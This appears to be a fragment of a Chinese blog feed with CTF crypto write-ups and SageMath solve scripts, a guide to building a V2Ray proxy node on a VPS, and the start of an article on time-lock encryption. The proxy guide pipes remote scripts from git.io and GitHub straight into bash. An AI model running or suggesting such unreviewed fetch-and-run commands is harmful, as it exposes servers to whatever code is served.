class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, -n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]<br>Q = [n ^ <span class="hljs-number">2</span>, n ^ <span class="hljs-number">1.5</span>, n ^ <span class="hljs-number">2.4</span>, n, n ^ <span class="hljs-number">2.4</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">0.5</span>, n ^ <span class="hljs-number">2.4</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">1.4</span>, n ^ <span class="hljs-number">1.9</span>,<br>     n ^ <span class="hljs-number">1.4</span>, n ^ <span class="hljs-number">1.4</span>, <span class="hljs-number">1</span>]<br>P = [<span class="hljs-number">1</span>, e1, e2, e1 * e2, e3, e1 * e3, e2 * e3, e1 * e2 * e3, e4, e1 * e4, e2 * e4, e1 * e2 * e4, e3 * e4, e1 * e3 * e4,<br>     e2 * e3 * e4, e1 * e2 * e3 * e4]<br>A, P, Q = matrix(ZZ, A), diagonal_matrix(ZZ, P), diagonal_matrix(ZZ, Q)<br>A = P * A * Q<br>w = vector(ZZ, A.LLL()[<span class="hljs-number">0</span>])<br>v = w * A ^ (-<span class="hljs-number">1</span>)<br>phi = <span class="hljs-built_in">int</span>(e1 * v[<span class="hljs-number">1</span>] // v[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(phi))<br>d = inverse(e, phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n)))<br></code></pre></td></tr></table></figure><h2 id="baby-classical">baby_classical</h2><p>看着复杂，把题目函数都理一遍，其实就一个矩阵运算，类维吉尼亚加密</p><p>考点：</p><ol><li>python</li><li>矩阵运算</li><li>维吉尼亚加密</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>dic = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;+/&#x27;</span> <span class="hljs-comment">#大写小写+/</span><br>f1nd = <span class="hljs-keyword">lambda</span> x: dic.find(x)<br><br>enc_key=<span class="hljs-string">&#x27;pVvRe/G08rLhfwa&#x27;</span><br><br>res=[f1nd(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc_key]<br>res=[res[i:i+<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(res),<span class="hljs-number">3</span>)]<br><span class="hljs-built_in">print</span>(res)<br>K= matrix(Zmod(<span class="hljs-number">64</span>),[[<span class="hljs-number">13</span> ,<span class="hljs-number">37</span> ,<span class="hljs-number">10</span>],<br> [<span class="hljs-number">15</span> ,<span class="hljs-number">17</span> ,<span class="hljs-number">41</span>],<br> [<span class="hljs-number">13</span>  ,<span class="hljs-number">0</span> ,<span class="hljs-number">10</span>]])<br>long=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    r=matrix(Zmod(<span class="hljs-number">64</span>),[i])<br>    l=r*K^-<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(l)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> l[<span class="hljs-number">0</span>]:<br>        long.append(<span class="hljs-built_in">int</span>(j))<br><span class="hljs-built_in">print</span>(long)<br>dicn2s=&#123;i: dic[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)&#125;<br>dics2n = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(dicn2s.values(), dicn2s.keys()))<br><span class="hljs-built_in">print</span>(dics2n)<br>key=<span class="hljs-string">&#x27;&#x27;</span>.join([dicn2s[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> long])[:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(key) <span class="hljs-comment">#W3ar3N0wayBack</span><br><br>c=<span class="hljs-string">&#x27;1k2Pe&#123;24seBl4_a6Ot_fp7O1_eHk_Plg3EF_g/JtIonut4/&#125;&#x27;</span><br>c=c.replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> dic:<br>        flag+=dic[ (f1nd(i)-f1nd(key[j%<span class="hljs-built_in">len</span>(key)]) )%<span class="hljs-number">64</span> ]<br>    <span class="hljs-keyword">else</span>:<br>        flag+=i<br>    j+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br>flag=flag.replace(<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>).replace(<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>).split(<span class="hljs-string">&#x27;_&#x27;</span>)<br>flag=<span class="hljs-string">&#x27;_&#x27;</span>.join([i[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag])<br><span class="hljs-built_in">print</span>(flag.swapcase())<br><span class="hljs-comment">#NKCTF&#123;ClaSsic_c0de_d0l1s_aRe_r3a1ly_int3reSting&#125;</span><br></code></pre></td></tr></table></figure><h1 id="N1CTF招新赛">N1CTF招新赛</h1><h2 id="ezezez">ezezez</h2><p>知识点：椭圆曲线，数论，Related Message Attack</p><p>语言：sagemath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a = <span class="hljs-number">259416965926853287275013962386631097709</span><br>n = <span class="hljs-number">8963244108103857378610478915798540027754205184635651624801332901515870452435977078824267979279218575027152343028911705254378598817260939339516835322386427</span><br>gy = [<span class="hljs-number">1896722249337161391193797083807118705857637064141055866260977430130447249097804719101078827699386498665026965515554644281163046869672493999194358926022865</span>, <span class="hljs-number">1971472878970365404484102034878792535366624572891039926216530789642810299559238977732710681752685090332485586910206690093655977703795335533365202958013518</span>, <span class="hljs-number">4074555112002157403114317690671003025383051142150876016519408756236925988856478235258960189636836867363451314784889114354880607055705753428890566240606935</span>]<br><span class="hljs-comment">#y^2=x^3+ax+b mod n</span><br>magic = bytes_to_long(<span class="hljs-string">b&#x27;N1Junior_CheckIn&#x27;</span>)<br>e=<span class="hljs-number">24</span><br>gx1=magic<br>b=(gy[<span class="hljs-number">1</span>]*gy[<span class="hljs-number">1</span>]-gx1*gx1*gx1-a*gx1)%n <span class="hljs-comment">#求出b</span><br><br><span class="hljs-comment">#fx=y0^2-(x^e)^3-a(x^e)-b</span><br><span class="hljs-comment">#gx=y2^2-((x+magic)^e)^3-a( (x+magic)^e )-b</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">g1, g2</span>):<br>    <span class="hljs-keyword">while</span> g2:<br>        g1, g2 = g2, g1 % g2<br>    <span class="hljs-keyword">return</span> g1.monic()<br>PR.&lt;x&gt;=PolynomialRing(Zmod(n))<br>fx=gy[<span class="hljs-number">0</span>]*gy[<span class="hljs-number">0</span>]-x^(<span class="hljs-number">3</span>*e)-a*x^e-b<br>gx=gy[<span class="hljs-number">2</span>]*gy[<span class="hljs-number">2</span>]-(x+magic)^(<span class="hljs-number">3</span>*e)-a*((x+magic)^e)-b<br><span class="hljs-built_in">print</span>(gcd(fx,gx))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vps搭建自用节点</title>
    <link href="/2023/11/02/vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/"/>
    <url>/2023/11/02/vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="VPS选择">VPS选择</h1><p>首先选择vps一定要选择国外的，国内的都不允许私自搭建节点，一旦发现就会被查封并且不予退款。</p><p>我选的是NackNerd的vps，这家vps不接受退款，虽然便宜但是要谨慎选择，可以选一些支持退款的先试试速度。</p><p>一般来说NackNerd西雅图或者圣何塞可能会好一点，实测开了bbr加速在下午延迟只有120ms左右，还算可以。但是晚高峰延迟比较高，预算比较低的情况下可以考虑，预算高建议买搬瓦工的国内专线。</p><p>可以在网上搜索对应购买优惠，会便宜很多，我的是11.38$买的西雅图节点，使用的是Ubuntu系统，之后的一切命令都是基于Ubuntu系统，如果是centos或者其他请自行搜索相应命令。</p><p>购买成功之后会用邮箱发送给你对应主机IP和用户名以及密码。</p><h1 id="启用CDN，拯救被墙IP">启用CDN，拯救被墙IP</h1><p>如果你的vps节点被墙过，那就最好用CDN加速。</p><p>但是没有的话可以没必要使用，Cloudfare号称“减速云”，平时延迟250ms起步，很影响上网速度，而且cdn能解密你所有的流量，还是挺不安全的。</p><h2 id="域名购买">域名购买</h2><p>首先我们需要一个域名，这里可以自行购买。</p><h2 id="修改DNS解析服务器">修改DNS解析服务器</h2><p>随后登录<a href="https://cloudfare.com/">Cloudfare</a>官网，先注册后登录，登录成功之后在Home中点击添加站点，再在跳转后的页面输入自己注册的域名。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE12.png" alt="图12"></p><p>使用免费的方案即可。</p><p><img src="vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/image-20231103161306583.png" alt="image-20231103161306583"></p><p>随后Cloudfare会自动给你分配两个DNS，如果没有就进入DNS解析之中查看。</p><p><img src="vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/image-20231103161758749.png" alt="image-20231103161758749"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103161612923.png" alt="image-20231103161612923"></p><p>之后在注册域名的平台搜索如何更改DNS，比如我用的阿里云的，我就搜索阿里云域名更改DNS，照着官方教程来将你域名的DNS改成Cloudfare给你分配的两个地址。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103180355593.png" alt="image-20231103180355593"></p><p>更改DNS之后不同厂家需要的时间不同，阿里云就需要最多48小时才会成功生效，一定要确保DNS更改生效之后方可进行接下来的操作。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103180525892.png" alt="image-20231103180525892"></p><h2 id="设置Cloudfare证书">设置Cloudfare证书</h2><p>点击左侧SSL/TLS协议，概述部分。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103181349420.png" alt="image-20231103181349420"></p><p>将加密模式设置为严格。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103181330265.png" alt="image-20231103181330265"></p><h2 id="添加DNS解析">添加DNS解析</h2><p>在cloudfare中的DNS解析点击添加记录，添加你想要伪装的域名，尽量不要使用裸域名，不会填的跟我填一样的就好。</p><p>IPv4地址就是你vps的主机地址，记得把代理状态改成仅限DNS，点击save保存就好了。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103175812801.png" alt="image-20231103175812801"></p><p>到这里CDN域名的地方已经全部搞定了。</p><h1 id="节点搭建">节点搭建</h1><h2 id="连接到VPS">连接到VPS</h2><p>首先连接ssh，我使用的是Xshell，点击连接，在主机这里输入对应的IP地址。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE1.png" alt="图1"></p><p>点击用户身份验证，输入邮箱中收到的用户名和密码，点击连接。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE2.png" alt="图2"></p><p>点击接收并保存。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE3.png" alt="图3"></p><p>出现这样的页面就是成功了：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE4.png" alt="图4"></p><p>想换密码的可以输入passwd直接更换密码，更换密码之后在该ssh连接的设置中也要相应更改用户身份验证的密码，这里就不演示了。我们输入apt-get update命令，如果没有root权限要先输入su然后输入密码进入root：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE5.png" alt="图5"></p><p>之后使用脚本一键安装：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">bash &lt;(<span class="hljs-name">wget</span> -qO- -o- https<span class="hljs-symbol">://git</span>.io/v2ray.sh)<br></code></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE6.png" alt="图6"></p><p>之后输入v2ray，进入管理界面，输入1添加一个配置：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE7.png" alt="图7"></p><p>之后选择8）VLESS-WS-TLS：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE8.png" alt="图8"></p><p>这时候输入我们刚刚准备好的域名，注意这里当时前缀是什么就要加上前缀。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE9.png" alt="图9"></p><p>回车之后就完事了：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE10.png" alt="图10"></p><p>这时候选中复制这个url再导入v2rayN客户端中就好了：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE11.png" alt="图11"></p><h2 id="启用bbr加速">启用bbr加速</h2><p>如果你得网络很卡顿，延迟比较高的话，那你可以试试bbr加速，或许可以有改善。</p><p>bbr一键脚本：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">wget -N --no-<span class="hljs-keyword">check</span>-certificate <span class="hljs-string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> <span class="hljs-variable">&amp;&amp;</span> chmod +<span class="hljs-keyword">x</span> tcp.sh <span class="hljs-variable">&amp;&amp;</span> ./tcp.sh<br></code></pre></td></tr></table></figure><p>这个脚本包含bbr/bbr魔改版/bbrplus/锐速，多个加速可以选择，这里我们选择2.bbrplus：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE13.png" alt="图13"></p><p>有的会出现这种界面，这时候输入右方向键选择No：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE14.png" alt="图14"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE15.png" alt="图15"></p><p>输入y重启，重启之后要双击这左边的这个红红的重新建立连接。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103180146919.png" alt="image-20231103180146919"></p><p>之后使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./tcp.sh<br></code></pre></td></tr></table></figure><p>重新运行脚本，选择7开启bbrplus加速。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE16.png" alt="图16"></p><p>到这里所有工作已经做完了，右键v2rayN客户端的小图标，选择自动配置即可科学上网了，想关掉的时候点清除系统代理就行。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103175219970.png" alt="image-20231103175219970"></p>]]></content>
    
    
    
    <tags>
      
      <tag>vps节点</tag>
      
      <tag>CDN加速</tag>
      
      <tag>VLESS-WS-TLS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>时控性加密的实现</title>
    <link href="/2023/10/31/%E6%97%B6%E6%8E%A7%E6%80%A7%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/10/31/%E6%97%B6%E6%8E%A7%E6%80%A7%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="时控性加密原理">时控性加密原理</h1><p>要想实现一个加密算法首先先清楚它的原理，时控性加密算法以其独特的时间敏感而广泛应用。</p><h2 id="初始化">初始化</h2><p>首先时控性加密规定了几个域：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mtext>为素数</mtext><mi>q</mi><mtext>的循环加法群</mtext><mspace width="1em"/><msub><mi>G</mi><mn>2</mn></msub><mtext>为素数</mtext><mi>q</mi><mtext>的循环乘法群</mtext><mspace linebreak="newline"></mspace><mtext>双线性映射</mtext><mi>e</mi><mo>:</mo><msub><mi>G</mi><mn>1</mn></msub><mo>×</mo><msub><mi>G</mi><mn>1</mn></msub><mo>→</mo><msub><mi>G</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><msub><mi>H</mi><mn>1</mn></msub><mo>:</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup><mo>→</mo><msub><mi>G</mi><mn>1</mn></msub><mspace width="2em"/><msub><mi>H</mi><mn>2</mn></msub><mo>:</mo><msub><mi>G</mi><mn>2</mn></msub><mo>→</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>n</mi></msup><mo separator="true">,</mo><mtext> </mtext><mi>n</mi><mtext>为明文长度</mtext><mspace linebreak="newline"></mspace><mtext>选取</mtext><msub><mi>G</mi><mn>1</mn></msub><mtext>群中的生成元</mtext><mi>P</mi><mo>∈</mo><msub><mi>G</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">G_1\text{为素数} q\text{的循环加法群}\quadG_2\text{为素数}q\text{的循环乘法群}\\\text{双线性映射}e:G_1 \times G_1 \rightarrow G_2\\H_1:\{0,1\}^* \rightarrow G_1\qquadH_2:G_2 \rightarrow \{0,1\}^n,\ n\text{为明文长度}\\\text{选取}G_1\text{群中的生成元}P\in G_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">为素数</span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord text"><span class="mord cjk_fallback">的循环加法群</span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">为素数</span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord text"><span class="mord cjk_fallback">的循环乘法群</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">双线性映射</span></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord text"><span class="mord cjk_fallback">为明文长度</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord text"><span class="mord cjk_fallback">选取</span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t 